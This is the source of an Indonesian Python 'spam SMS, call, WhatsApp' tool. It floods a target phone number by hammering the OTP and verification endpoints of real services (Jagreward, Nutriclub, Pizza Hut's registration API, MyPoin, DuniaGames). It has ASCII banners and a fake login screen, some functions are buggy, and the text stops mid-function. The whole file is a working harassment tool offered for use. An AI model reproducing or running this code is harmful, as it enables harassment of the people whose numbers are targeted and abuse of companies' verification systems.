#	 Tools : Kakkoi Namae II ( Spam Sms, Call, Wa)
#	 Author : Kakkoi Namae II ( Three Master )
#	 github : https://github.com/Kakkoinamae
#	 Note :  Jangan Di gunakan Untuk Menjahili Orang Tua
#	 Gunakan Lah Untuk Bersenang Senak dapat terkirim di karenakan sudah limit! \033[37m 'ang !!!
#	 Import, From
		# Jangan di ubah
import socket
import re
# Get IP User For Module Socket
try:
        import threading,time,sys,os,json,requests,random,re,get
        from bs4 import BeautifulSoup as bs
        from requests import post
        from fake_useragent import UserAgent

except ModuleNotFoundError:
         print ()
         print ('\033[1;97m[\033[1;91m!\033[1;97m] \033[1;93mInstall Module Requests\033[1;97m')
         print ()
#         os.system('pip2 install requests')
#        os.system('pkg install screenfetch')
#try:    # Janggan di ubah
#        ip = requests.get('https://api.ipify.org').text
#except requests.exceptions.ConnectionError:
#        print ()
 #       exit(' [!] Koneksi Internet Error')
			# git pull untuk melakukan update otomatis ahahahahahahaha
print ()
os.system("git pull")
req = requests.Session()
kakkoi_point = 1
				# Jangan di ubah ahahahahha
Email = random.choice(['lavon.lockman@gmail.com','duane_mclaughlin38@gmail.com','alfreda.lindgren@gmail.com','leonardo_kuhlman@gmail.com','lyric51@gmail.com','devonte_littel@gmail.com','newell.kuhic@gmail.com'])
				# Jangan di ubah ahahahahah
Name = random.choice(["Halo Penipu","Halo Kawan","Halo Sayang","Halo Janda","Halo Ripper"])
# -------{ ini adalah inti dari script nya }-------- # ahahhaahahahaahahahaha
def mr_dark_nutric(nom):
  darkreq = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if 'succes' in darkreq.text:
       print (f'		\033[1;37m[\033[1;32m✓\033[1;37m] \033[1;33mSuccesfully Mengirim Spam Call Ke \033[1;32m{nom}\033[1;37m')
       time.sleep(2)
  else:
       print (f'		\033[1;37m[\033[31m!\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan sudah limit! \033[37m ')
       time.sleep(2)
def mr_dark_jag(nom):
  dark_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+nom)
  dark_json = json.loads(dark_request.text)
  if dark_json["message"] == '		Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.':
       print (f"		\033[1;37m[\033[1;32m✓\033[1;37m] \033[1;33mSuccesfully Mengirim Spam Call Ke \033[1;32m{nom}\033[1;37m")
       time.sleep(2)
  else:
       print (f'   		\033[1;37m[\033[31m!\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan sudah limit! \033[37m ')
       time.sleep(2)
# IP Address User ahahahahahahahaha
AopaIdd = socket.gethostname()
Angata = socket.gethostbyname(AopaIdd)
Nuhung = Angata
# data spam call ahahahahahahahaha
def call():
#	try:
#		ip = requests.get('https://api.ipify.org').text
#	except requests.exceptions.ConnectionError:
#		time.sleep(2)
#		print ()
#		exit(' [!] Koneksi Internet Error')
	print ()
	time.sleep(1)
	print ("Kakkoi Spammer tip: Kakkoi Spammer")
	print ("peringatan !!! Spam Call ini masih dalam tahap")
	print ("proses penyelesaian jadi maaf kalau masih ada bug")
	print ("anda bisa melaporkan nya melalu kontak saya")
	print ("your the number target contoh : 858xxx")
	print ("")
	kakkoi_point = 1
	call = input("\033[1;97mNumber \033[1;91mTarget > \033[1;97m")
	if call == "":
		print ()
		time.sleep(1)
		exit("[\033[1;91mx\033[1;97m] \033[1;93mGak Boleh Kosong...")
	elif len(call) <= 10:
		print ()
		time.sleep(1)
		exit("[\033[1;91mx\033[1;97m] \033[1;93mMasukkan Nomor Dengan Benar...")
	else:
		jumlah = int(input("Jumlah \033[1;91mSpam > \033[1;93m"))
		if jumlah == "":
			print ()
			time.sleep(1)
			exit("[\033[1;91mx\033[1;97m] \033[1;93mGak Boleh Kosong...")
		elif jumlah > 5:
			print ()
			time.sleep(1)
			exit("[\033[1;91mx\033[1;97m] \033[1;93mJumlah Melebihi Batas...")
		else:
			print ("		\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
			time.sleep(2)
			print ()
			print (f"		\033[1;97m[\033[1;91m!\033[1;97m] Check Status..")
			time.sleep(2)

		url = "https://id.jagreward.com/member/verify-mobile/"
		ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
		dat = {"method": "CALL","countryCode": "id",}

		for i in range(jumlah):
			send = requests.post(url+call, headers=ua, data=dat)
			if send.json()['message'] in send:
				print ()
				print (f'		\033[1;37m[\033[31m!\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan sudah limit! \033[37m ')
				print ()
				time.sleep(2)
			else:
				print ()
				print (f'		\033[1;37m[\033[1;32m✓\033[1;37m] \033[1;33mSuccesfully Mengirim Spam Call Ke \033[1;32m{call}\033[1;37m')
				print ()
				time.sleep(2)
# Mencari Tahu Nama Pengguna ahahahahahahahahahahaha
# nih bagiam sinj gua hampir salah anying... ahahahahahahahahaha
""" ampe ampe gua hampir aja bikin semua
syntax jadi multi line...
kan tolol yaaaa bang.... ahahahahahaha anyinggggggggg, Btw Salken Nama Gua Ugel
gua temen nya si Mr Kratos Dan Abg Xenzi Btw Mereka Ke Dua Teman Yg Sangat² Keren Dan Is The Best For My Friends In Whatsapp
Gua Salah Satu Anggota Mavia Teknologi Yg Status Nya Hanyalah Script Kiddies Dan Si Sampah Yang Bego Gk Bisa Html Ama C++ Pdhl Impian Mau Jadi Hekerrrrrrrr
ngerek, Ngorok, Asuiiiii, Kampreeeest..... dah gua gabut"""
# Finished ahahahahahahahahahahahahahahahahahahahahahahahaha
time.sleep(3)
print ()
siapa = input("\033[1;93mWhats Your Name ? \033[1;91m> \033[1;97m")
if siapa =="":
	print ()
	time.sleep(1)
	exit("[\033[1;91mx\033[1;97m] \033[1;93mGak Boleh Kosong...")
else:
	print ()
	time.sleep(1)
	print (f"\033[1;93mWelcome\033[1;97m {siapa} \033[1;93mTo Program \033[1;91mKakkoi Spammer \033[1;97mツ")
	time.sleep(3)
#Data Siapa """emang nya siapa yaaa... ahahahahahahahahahahahs"""
kamu = siapa
# Data Spam Brutall ahahahahahahahaahahahaha
def brutal():
#	try:
#		ip = requests.get('https://api.ipify.org').text
#	except requests.exceptions.ConnectionError:
#		time.sleep(2)
#		print ()
#		exit("		[!] Connection Error")

	os.system("clear")
	os.system("screenfetch -A Debian")
	print ()
	print (f"""
		[\033[1;91m•\033[1;97m] Author  \033[1;93m: \033[1;92mKakkoi Namae\033[1;97m
		[\033[1;91m•\033[1;97m] Youtube \033[1;93m: \033[1;91mNone\033[1;97m
		[\033[1;91m•\033[1;97m] Github  \033[1;93m: \033[1;92mhttps://github.com/Kakkoinamae
		\033[1;93m----------------------------------------\033[1;97m

		[\033[1;91m+\033[1;97m] Nama     \033[1;93m: \033[1;92m{kamu}\033[1;97m
		[\033[1;91m+\033[1;97m] Pengguna \033[1;93m: \033[1;92m1,266 \033[1;97mOrang
		[\033[1;91m+\033[1;97m] IP KAMU  \033[1;93m: \033[1;92m{Nuhung}""")
	print ()
	time.sleep(1)
	print ("		\033[1;92m• Note :\033[1;97m")
	print ()
	print ("		Kakkoi Spammer tip: Kakkoi Spammer")
	print ("		peringatan !!! mode brutal ini masih dalam tahap")
	print ("		proses penyelesaian jadi maaf kalau masih ada bug")
	print ("		anda bisa melaporkan nya melalu kontak saya")
	print ("		your the number target contoh : 858xxx")
	print ("")
	kakkoi_point = 1
	nom = input("		\033[1;97mNumber \033[1;91mTarget > \033[1;97m")
	if nom == "":
		print ()
		time.sleep(1)
		exit("		[\033[1;91mx\033[1;97m] \033[1;93mGak Boleh Kosong...")
	elif len(nom) <= 10:
		print ()
		time.sleep(1)
		exit("		[\033[1;91mx\033[1;97m] \033[1;93mMasukkan Nomor Dengan Benar...")
	else:
		print ()
		time.sleep(1)
		print ("		\033[1;97mStatus \033[1;93m: \033[1;92mOnline")
		time.sleep(2)
		print (f"		\033[1;97mTarget \033[1;93m: \033[1;92m{nom}")
		time.sleep(2)
		print ("		\033[1;31m<════════════[\033[1;33;42m • \033[1;37mSTARTING \033[1;33m• \033[0m\033[1;31m]══════════════>")
		time.sleep(2)
		print ()
		print ("		\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS   \033[1;33m• \033[0m\033[1;30m]══════════════>")
		Pizza(nom)
		mypoin(nom)
		mr_dark_jag(nom)
		mr_dark_nutric(nom)
# Data Pizza Hut
def Pizza(nom):
	hd = {
	'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36',
	'referer': 'https://www.phd.co.id/register',
	'Host': 'api-prod.diqit.io',
	'content-type':'application/json;charset=UTF-8',
	}
	dat = {'phone':nom}
	for x in range(6):
		ugel = requests.post("https://api-prod.diqit.io/customer/v1/customer/register", headers=hd, json=dat)
	if "Error" in ugel:
		print (f"		\033[1;97m[\033[1;91mx\033[1;97m] \033[1;93mGagal Mengirim Di Nomor \033[1;92m{nom}\033[1;97m")
	else:
		print (f"		\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;93mSuccesfully Mengirim Spam Ke \033[1;92m{nom}\033[1;97m")
# Data Info Dunia Games
def gamez(nom):
         inquiryId_telkom = "219424679"
         dark={
         "phoneNumber":nom
         }
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(6):
             darko=requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers=mr_telkom,json=dark).text
             if 'Field ini harus diisi dengan nomor Telkomsel' in darko:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mNo Target Harus Menggunakan Telkomsel! \033[31m ')
                  time.sleep(2)
                  print ("\033[1;30m<═════════════[\033[1;33;41m • \033[1;37mSTOP \033[1;33m• \033[0m\033[1;30m]═══════════════>")
                  break
             if 'Maaf, Anda belum melakukan konfirmasi OTP di transaksi sebelumnya, silakan coba kembali setelah 1 menit' in darko:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan inquiryId sedang di gunakan!, Mohon Coba Lagi! \033[31m ')
             else:
                  print ('   \033[1;37m[\033[1;32m#\033[1;37m] \033[1;32mTerkirim \033[31m ')
             countdownTimer(00, 60)
# Data My Poin
def mypoin(nom):
     url = 'https://mypoin.id/register/validate-phone-number'
     otp = 'https://mypoin.id/register/request-otp'
     uat = {"user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"}
     uatp = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/web,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","content-length": "102","content-type": "application/x-www-form-urlencoded; charset=UTF-8","origin": "https://mypoin.id","referer": "https://mypoin.id/register/validate-phone-number","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","x-requested-with": "XMLHttpRequest"}
     a = requests.get(url,headers=uat).text
     b = (a,'html.parser')
     c = b.find("input",attrs={"type":"hidden","name":"csrfmiddlewaretoken"})
     e = requests.post(otp,headers=uatp,data={"phone":"62"+nom,"csrfmiddlewaretoken": c["value"]}).text
     if e == '{"status": "ok"}':
      print (f" 		\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;93mSuccesfully Mengirim Spam Ke \033[1;92m{nom}\033[1;97m")
     else:
      print (f"			\033[1;97m[\033[1;91mx\033[1;97m] \033[1;93mGagal Mengirim Di Nomor \033[1;92m{nom}\033[1;97m")
# Menu Pertama
def bersih():
	os.system("clear")
# Keluar
def keluar():
	print ()
	print ("TERIMA KASIH SUDAH MEMAKAI PROGRAM SAYA")
	print ("BY² \033[1;91mATTACKER \033[1;97m:(")
	print ()
	time.sleep(1)
	os.sys.exit()
# Mencari Tahu Nama Pengguna
def siapa():
	time.sleep(3)
	print ()
	siapa = input("\033[1;93mWhats Your Name ? \033[1;91m> \033[1;97m")
	if siapa =="":
		print ()
		time.sleep(1)
		exit("[\033[1;91mx\033[1;97m] \033[1;93mGak Boleh Kosong...")
	else:
		print ()
		time.sleep(1)
		print ("\033[1;93mWelcome\033[1;97m",siapa,"\033[1;93mTo Program \033[1;91mKakkoi Spammer \033[1;97mツ")
		time.sleep(3)
# Menu Kedua
def sandi():
	bersih()
	time.sleep(1)
	print ("______________________________________________________________________________")
	print ("|                                                                              |")
	print ("|                         \033[1;91mKAKKOI SPAMMER \033[1;93mVERSION 1.2                           \033[1;97m|")
	print ("|______________________________________________________________________________|")
	print ("|                                                                              |")
	print ("|                                                                              |")
	print ("|                                                                              |")
	print ("|                \033[1;91mUser Name:           \033[1;97m[   \033[1;92mMuhammad    ]                        \033[1;97m|")
	print ("|                                                                              |")
	print ("|                 \033[1;91mPassword:           \033[1;97m[   \033[1;92mRistawakal N ]                       \033[1;97m|")
	print ("|                                                                              |")
	print ("|                                                                              |")
	print ("|                                                                              |")
	print ("|                                   \033[1;97m[ \033[1;91mOK \033[1;97m]                                     |")
	print ("|______________________________________________________________________________|")
	print ("|                                                                              |")
	print ("|                                               https://github.com/Kakkoinamae |")
	print ("|______________________________________________________________________________|")
	print ()
	print ("       =[ \033[1;91mTools_Spammer \033[1;93mv1.2.0-dev-c3132v0\033[1;97m                ]")
	print ("+ -- --=[ Author - Kakkoi Namae (Mavia Teknologi)         ]")
	print ("+ -- --=[ Facebook - Kakkoi Namae II                      ]")
	print ("+ -- --=[ BRUTEFORCE                                      ]")
	print ()
	print ("			Masukkan \033[1;91mUser name \033[1;97mDan \033[1;91mPassword !!!")
	print ()
	contoh = input("			\033[1;97m[\xf0\x9f\x94\x90] \033[1;91mUSER NAME :\033[1;92m ")
	if contoh == "Muhammad":
		time.sleep(1)
		print ("			\033[1;97m[\xe2\x9c\x93] \033[1;94mUSERNAME:\033[1;92m " + contoh + "\033[1;92m(✓)")
		time.sleep(2)
		print ()
	else:
		time.sleep(1)
		print ("			\033[1;97m[\xf0\x9f\x94\x90] \033[1;91mUSERNAME : SALAH (X)")
		time.sleep(1)
		print ("			\033[1;97mSILAHKAN COBA LAGI \033[1;91m!")
		time.sleep(2)
		sandi()
	contoh2 = input("			\033[1;97m[\xf0\x9f\x94\x90] \033[1;91mPASSWORD :\033[1;92m ")
	if contoh2 == "Ristawakal N":
		time.sleep(1)
		print ("			\033[1;97m[\xe2\x9c\x93] \033[1;94mPASSWORD:\033[1;92m " + contoh2 + "\033[1;92m(✓)")
		time.sleep(2)
	else:
		time.sleep(1)
		print ("			\033[1;91m[\xf0\x9f\x94\x90] \033[1;91mPASSWORD : SALAH (X)")
		time.sleep(1)
		print ("			\033[1;91mSILAHKAN COBA LAGI ! HAMPIR DEKAT...")
		time.sleep(2)
		sandi()
# Sandi
#sandi()
# Banner Nya Cuuk
banner ="""
                     .ed$$$" ""$$$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /                      "4$$b
               d  3                      $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "
                     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       .""$"*$$$$$$$$bc
                    .-"    .$***$$$""$"*e.
                 .-"    .e$"     "*$c  ^*b.
          .=*$"$"    .e$*"          "*bc  "*$e..
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"                     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*     Love Spammer             *  J$$$e*
            $$$$                            "$$$" """
# Banner Baru/New
banner_new ="""
                   -'           ^''**$$$e.
                 .*                   '$$$c
                /                      '4$$b
               d  3                      $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b \033[1;91m^ceeeee.  \033[1;97m4$\033[1;91m$ECL.F\033[1;97m*$$$$$$$
  e$''=.      $$$$P \033[1;91md$$$$F $ \033[1;97m$$\033[1;91m$$$$$$$- \033[1;97m$$$$$$
 z$$b. ^c     3$$$F \033[1;91m'$$$$b   \033[1;97m$'\033[1;91m$$$$$$$  \033[1;97m$$$$*'      .=''$c
4$$$$L        $$P'  \033[1;91m'$$b   .\033[1;97m$ $\033[1;91m$$...  \033[1;97me$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  '**$$$ec   '   %ce""    $$$  $$$$$$$$$$*    .r' =$$$$P''
        '*$b.  'c  *$e.    *** d$$$$$'L$$    .d'  e$$***
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*'.eeP'
             '$$$$$$''$=e....$*$$**$cz$$' '..d$*'
               '*$$$  *=%4.$ L L$ P3$$$F $$$P'
                  '$   '%*ebJLzb$e$$$$$b $P'
                    %..      4$$$$$$$$$$ '
                     $$$e   z$$$$$$$$$$%
                      '*$c  '$$$$$$$P'
                       .''$'*$$$$$$$$bc
                    .-'    .$***$$$''$'*e.
                 .-'    .e$'     '*$c  ^*b.
          .=*$'$'    .e$*'          '*bc  '*$e..
        .$'        .z*'               ^*$e.   '*****e.
        $$ee$c   .d'                     '*$.        3.
        ^*$E')$..$'                         *   .ee==d%
           $.d$$$*      \033[1;91mlove spammer      \033[1;97m'$$$'             \033[1;97m
            $$$$                             '$$$'

                                https://github.com/KakkoiNamae"""
# Menu Ketiga
def logo():
	bersih()
	time.sleep(2)
	print ("\033[1;91m                .;lxO0KXXXK0Oxl:. ")
	print ("\033[1;91m            ,o0WMMMMMMMMMMMMMMMMMMKd, ")
	print ("\033[1;91m         'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx, ")
	print ("\033[1;91m       :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK: ")
	print ("\033[1;91m     .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX, ")
	print ("\033[1;91m    lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo ")
	print ("\033[1;91m   xMMMMMMMMMMWd.               .oNMMMMMMMMMMk ")
	print ("\033[1;91m  oMMMMMMMMMMx.                    dMMMMMMMMMMx ")
	print ("\033[1;91m  WMMMMMMMMM:                       :MMMMMMMMMM, ")
	print ("\033[1;91m xMMMMMMMMMo                         lMMMMMMMMMO ")
	print ("\033[1;91m NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc; ")
	print ("\033[1;91m MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX: ")
	print ("\033[1;91m NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX: ")
	print ("\033[1;91m xMMMMMMMMMd                        ,0MMMMMMMMMMK; ")
	print ("\033[1;91m .WMMMMMMMMMc                         'OMMMMMM0, ")
	print ("\033[1;91m  lMMMMMMMMMMk.                         .kMMO' ")
	print ("\033[1;91m   dMMMMMMMMMMWd'                         .. ")
	print ("\033[1;91m    cWMMMMMMMMMMMNxc'.               \033[1;97m########## ")
	print ("\033[1;91m     .0MMMMMMMMMMMMMMMMWc           \033[1;97m#+#    #+# ")
	print ("\033[1;91m       ;0MMMMMMMMMMMMMMMo.         \033[1;97m+""\033[1;91m:""\033[1;97m+ ")
	print ("\033[1;91m         .dNMMMMMMMMMMMMo         \033[1;97m+#++""\033[1;91m:""\033[1;97m++#+ ")
	print ("\033[1;91m            'oOWMMMMMMMMo                \033[1;97m+""\033[1;91m:""\033[1;97m+ ")
	print ("\033[1;91m                .,cdkO0K;        \033[1;91m:""\033[1;97m+""\033[1;91m:    :""\033[1;97m+""\033[1;91m: ")
	print ("\033[1;91m                                 \033[1;91m:::::::""\033[1;97m+""\033[1;91m:")
	print ()
	print ("\033[1;93m                      𝙆𝙖𝙠𝙠𝙤𝙞 𝙎𝙥𝙖𝙢𝙢𝙚𝙧 ")
	print ()
	print ("\033[1;97m				https://github.com/KakkoiNamae ")
	print ()
	time.sleep(1)
	print ("       =[ \033[1;91mTools_Spammer \033[1;93mv1.2.0-dev-c3132v0                \033[1;97m]")
	time.sleep(1)
	print ("+ -- --=[ Author - Kakkoi Namae (Mavia Teknologi)         ]")
	time.sleep(1)
	print ("+ -- --=[ Facebook - Kakkoi Namae II                      ]")
	time.sleep(1)
	print ("+ -- --=[ BRUTEFORCE                                      ]")
	print ("")
	time.sleep(1)
	print (f"Kakkoi Spammer tip: Kakkoi Spammer	[\033[1;91m+\033[1;97m] Nama \033[1;93m: \033[1;97m{kamu} \033[1;92m")
	print (f"\033[1;97mcan be configured at startup, see	[\033[1;91m+\033[1;97m] IP	 \033[1;93m: \033[1;97m{Nuhung} \033[1;92m	•")
	print (f"\033[1;91mSpammer \033[1;97mhelp to learn more		[\033[1;91m+\033[1;97m] Mode \033[1;93m: \033[1;97mGratis \033[1;92m 	•\033[1;97m")
	print ("")
# Logo ()
logo()
# Menu Keempat
def menu():
	contoh3 = input("\033[1;97mKS_\033[1;93mV2.1 \033[1;91m> \033[1;97m")
	if contoh3 == "help":
		print ("")
		print (" Core Commands")
		print ("==============")
		print ()
		print ()
		print ("		 Command		Description ")
		print ("		============		===================")
		print ("		banner		:	Display an awesome Kakkoi Spammer banner")
		print ("		help		:	To help menu")
		print ("		contact		:	Contact me ?")
		print ("		spam		:	To start spammer")
		print ("		exit		:	Exit to program")
		print ("		version		:	Check in version program")
		print ("		info		:	Information the program")
		print ("		date		:	you are date ? ")
		print ("		clear		:	Did you mean to clear program ?")
		print ("		login		:	How to login spammer ?")
		print ()
		time.sleep(1)
		print ("				\033[1;91mツ \033[1;97mComing Soon...")
		print ()
		menu()
	elif contoh3 == "exit":
		keluar()
	elif contoh3 == "date":
		print ()
		os.system ("date | lolcat")
		print ()
		menu()
	elif contoh3 == "version":
		print ("Kakkoi Spammer ")
		print ("Version \033[1;93m1.2.0-dev-c3132v0 ")
		menu()
	elif contoh3 == "clear":
		bersih()
		menu()
	elif contoh3 == "info":
		print ()
		print ("\033[1;91m		Kakkoi Spammer V.\033[1;93mv1.2.0-dev-c3132v0")
		print ("\033[1;91m		Author \033[1;97m: \033[1;93mKakkoi Namae II")
		print ("\033[1;91m		Github \033[1;97m: \033[1;93mhttps://github.com/Kakkoinamae")
		print ("\033[1;91m		Team   \033[1;97m: \033[1;93mMavia Teknologi")
		print ("\033[1;91m		Status \033[1;97m: \033[1;93mOnline")
		print ("\033[1;91m		Tools \033[1;97m : \033[1;93mSpammer")
		menu()
	elif contoh3 == "contact":
		print ()
		print ("	\033[1;93m	PILIH NOMOR BERAPA ? ")
		print ()
		print (" 	\033[1;94m1\033[1;97m.\033[1;91m>> \033[1;97mFacebook		\033[1;94m6\033[1;97m.\033[1;91m>> \033[1;97mDiscord")
		print (" 	\033[1;94m2\033[1;97m.\033[1;91m>> \033[1;97mWhatsapp		\033[1;94m7\033[1;97m.\033[1;91m>> \033[1;97mTik Tok")
		print (" 	\033[1;94m3\033[1;97m.\033[1;91m>> \033[1;97mInstagram		\033[1;94m8\033[1;97m.\033[1;91m>> \033[1;97mPinterest")
		print (" 	\033[1;94m4\033[1;97m.\033[1;91m>> \033[1;97mTelegram		\033[1;94m9\033[1;97m.\033[1;91m>> \033[1;97mXbox")
		print (" 	\033[1;94m5\033[1;97m.\033[1;91m>> \033[1;97mMessenger		\033[1;94m10\033[1;97m.\033[1;91m>> \033[1;97mYoutube")
		print ("				\033[1;94m11\033[1;97m.\033[1;91m>> \033[1;93mTo Exit")
		print ()
		time.sleep(1)
		new_kontak(contoh3)
		menu()
		spam(contoh3)
	elif contoh3 == "banner":
		time.sleep(1)
		print (banner_new)
		print ()
		menu()
	elif contoh3 == "login":
		sandi()
		logo()
		menu()
	elif contoh3 == "spam":
		time.sleep(2)
		bersih()
		print ("                   -'           ^''**$$$e.")
		print ("                 .*                   '$$$c")
		print ("                /                      '4$$b")
		print ("               d  3                      $$$$")
		print ("               $  *                   .$$$$$$")
		print ("              .$  ^c           $$$$$e$$$$$$$$.")
		print ("              d$L  4.         4$$$$$$$$$$$$$$b")
		print ("              $$$$b \033[1;91m^ceeeee.  \033[1;97m4$\033[1;91m$ECL.F\033[1;97m*$$$$$$$")
		print ("  e$''=.      $$$$P \033[1;91md$$$$F $ \033[1;97m$$\033[1;91m$$$$$$$- \033[1;97m$$$$$$")
		print (" z$$b. ^c     3$$$F \033[1;91m'$$$$b   \033[1;97m$'\033[1;91m$$$$$$$  \033[1;97m$$$$*'      .=''$c")
		print ("4$$$$L        $$P'  \033[1;91m'$$b   .\033[1;97m$ $\033[1;91m$$$$...  \033[1;97me$$        .=  e$$$.")
		print ("^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$")
		print ("  '**$$$ec   '   %ce""    $$$  $$$$$$$$$$*    .r' =$$$$P''")
		print ("        '*$b.  'c  *$e.    *** d$$$$$'L$$    .d'  e$$***'")
		print ("          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*'.eeP'")
		print ("             '$$$$$$''$=e....$*$$**$cz$$' '..d$*'")
		print ("               '*$$$  *=%4.$ L L$ P3$$$F $$$P'")
		print ("                  '$   '%*ebJLzb$e$$$$$b $P'")
		print ("                    %..      4$$$$$$$$$$ '")
		print ("                     $$$e   z$$$$$$$$$$%")
		print ("                      '*$c  '$$$$$$$P'")
		print ("                       .''$'*$$$$$$$$bc")
		print ("                    .-'    .$***$$$''$'*e.")
		print ("                 .-'    .e$'     '*$c  ^*b.")
		print ("          .=*$'$'    .e$*'          '*bc  '*$e..")
		print ("        .$'        .z*'               ^*$e.   '*****e.")
		print ("        $$ee$c   .d'                     '*$.        3.")
		print ("        ^*$E')$..$'                         *   .ee==d%")
		print ("           $.d$$$*     \033[1;91mlove spammer             \033[1;97m*  J$$$e*")
		print ("            $$$$                             '$$$'")
		print ()
		print ("                                https://github.com/KakkoiNamae")
		print ()
		time.sleep(1)
		print ("       =[ \033[1;91mTools_Spammer \033[1;93mv1.2.0-dev-c3132v0	          \033[1;97m]")
		time.sleep(1)
		print ("+ -- --=[ Author - Kakkoi Namae (Mavia Teknologi)         ]")
		time.sleep(1)
		print ("+ -- --=[ Facebook - Kakkoi Namae II                      ]")
		time.sleep(1)
		print ("+ -- --=[ BRUTEFORCE                                      ]")
		spam(contoh3)
	else:
		time.sleep(1)
		print ("[\033[1;91m!\033[1;97m] Command\033[1;91m", contoh3, "\033[1;97mNot Found")
		menu()
# Menu ()
# Eh Gak Jadi Wkwkwkwkwkw Soalx Kadang Nge bug Yaaa Jadi
"""gua harus ganti system nya di karena data² nya terpisah pisah
ohohohohogogogohohogogogogogoggoogogogoggogogogogogogogogog itu kode nya"""
# Spammer Hououo....
def spam(contoh3):
	print ()
	print (" Ketik \033[1;93m'exit' \033[1;97mUntuk Keluar Dari Program !")
	print ()
	print ("			 Pilih Jenis \033[1;91mSpam \033[1;91m:")
	print ()
	time.sleep(1)
	print ("	\033[1;93m1\033[1;97m). \033[1;91m> 	\033[1;97mSpam Sms		( \033[1;92mMatahari \033[1;97m) \033[1;93mBy \033[1;91mXenzi Ganz")
	print ("	\033[1;93m2\033[1;97m). \033[1;91m>	\033[1;97mSpam Wa			( \033[1;92mTokopedia \033[1;97m) \033[1;93mBy \033[1;91mMR. Dark")
	print ("	\033[1;93m3\033[1;97m). \033[1;91m>	\033[1;97mSpam Call		( \033[1;92mJagreward \033[1;97m) \033[1;93mBy \033[1;91mKakkoi Namae")
	print ("	\033[1;93m4\033[1;97m). \033[1;91m>	\033[1;97mSpam Brutal		( \033[1;92mSms, Call, Wa \033[1;97m) \033[1;97mNew...")
	print ("	\033[1;93m5\033[1;97m). \033[1;91m> 	\033[1;97mKembali Ke Menu...")
	print ()
	time.sleep(1)
	pilih2 = input("Number \033[1;91m> \033[1;97m")
	if pilih2 == "1":
		time.sleep(1)
		print ("Kakkoi Spammer tip: Kakkoi Spammer")
		print ("can be configured at startup, see")
		print ("your the number target contoh : 0858xxx")
		print ("")
		kakkoi_point = 1
		nomor = input("\033[1;97mNumber \033[1;91mTarget > \033[1;97m")
		if nomor == "":
			exit("[\033[1;91m!\033[1;97m] Gak Boleh Kosong")
		elif len(nomor) <= 9:
			exit("[\033[1;91m!\033[1;97m] Nomor Tidak Valid")
		else:
